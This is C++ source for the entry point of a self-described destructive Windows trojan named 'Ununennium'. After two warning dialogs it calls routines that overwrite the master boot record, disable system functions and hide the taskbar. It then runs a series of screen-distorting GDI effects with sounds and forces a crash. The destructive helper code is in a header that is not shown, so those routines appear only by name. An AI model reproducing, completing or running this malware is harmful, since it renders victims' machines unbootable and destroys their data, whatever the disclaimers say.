#include "Ununennium.h"
/* This is probably my last chemically named malware
I'm not responsible for any damage made using this
Work started on: October 22, 2024
I hate you Gustaa. */

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR cmdline, int cmdshow) {
	if (MessageBoxA(NULL, "You are about to run the Ununennium.exe Trojan horse that will overwrite your MBR and make this device unusable.\r\nIf you are seeing this without knowing what you just executed, just hit No and nothing bad will happen.\r\nBut, if you\'re taking a risk, or running it in a safe environment, like a virtual machine, hit Yes.\r\n\r\nIf you are running this on physical hardware, shut it down and delete this file quickly!\r\nTubercomiosis is not responsible for any damages made using this malware, reverse engineering it, or any artificial removal of this disclaimer!\r\nStill execute the malware?", "GDI-Trojan.Win32.Ununennium - Malware Execution Alert", MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) != IDYES)
	{
		exit(0);
	}
	if (MessageBoxA(NULL, "This is your final warning!\r\n\r\nThe creator of this malware is not responsible for any damages, as it was made for entertainment and scientific purposes only.\r\nShut this file down and delete it quickly, or hit Yes if you\'re running it on a VM.\r\nThis is your last chance.", "GDI-Trojan.Win32.Ununennium - Final Warning", MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) != IDYES)
	{
		exit(0);
	}
		if (!CheckForWindowsXP()) NotWindowsXP();
	System::KillMBR();
	System::Disabler();
	Sleep(2000);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)System::fakeMessage, NULL, 0, 0);
	Sleep(3000);
	System::HideTaskbar();
	Sleep(1000);
	CreateThread(NULL, 0, System::message, NULL, 0, 0);
	Sleep(1000);
	HANDLE gdi1 = CreateThread(NULL, 0, GDI::splitblt, NULL, 0, 0);
	Bytebeat::Sound1();
	Sleep(15000);
	EndPayload(gdi1);
	InvalidateRect(NULL, 0, 0);
	HANDLE gdi2 = CreateThread(NULL, 0, GDI::SustainEpicPayload, NULL, 0, 0);
//	Bytebeat::Sound2();
	Sleep(15000);
	EndPayload(gdi2);
	InvalidateRect(NULL, 0, 0);
	HANDLE gdi3 = CreateThread(NULL, 0, GDI::Payload2, NULL, 0, 0);
	Sleep(15000);
	EndPayload(gdi3);
	InvalidateRect(NULL, 0, 0);
	HANDLE gdi4 = CreateThread(NULL, 0, GDI::SrcpaintDisp, NULL, 0, 0);
	HANDLE gdi4b = CreateThread(NULL, 0, GDI::BouncingBezier, NULL, 0, 0);
	HANDLE gdi4c = CreateThread(NULL, 0, GDI::anglezoomer, NULL, 0, 0);
	Bytebeat::Sound3();
	Sleep(25000);
	EndPayload(gdi4); EndPayload(gdi4c);
	InvalidateRect(NULL, 0, 0);
	HANDLE gdi5 = CreateThread(NULL, 0, GDI::gradienttriangle, NULL, 0, 0);
	HANDLE gdi5b = CreateThread(NULL, 0, GDI::trigonshake, NULL, 0, 0);
	Bytebeat::Sound4();
	Sleep(30000);
	EndPayload(gdi5); EndPayload(gdi5b);
	InvalidateRect(NULL, 0, 0);
	HANDLE gdi6 = CreateThread(NULL, 0, GDI::melt, NULL, 0, 0);
	HANDLE gdi6b = CreateThread(NULL, 0, GDI::setshake, NULL, 0, 0);
	Bytebeat::Sound5();
	Sleep(22000);
	EndPayload(gdi6); EndPayload(gdi6b); EndPayload(gdi4b);
	InvalidateRect(NULL, 0, 0);
	HANDLE last = CreateThread(NULL, 0, GDI::patstatic, NULL, 0, 0);
	Bytebeat::Sound6();
	Sleep(5000);
	System::CauseCrash();
}
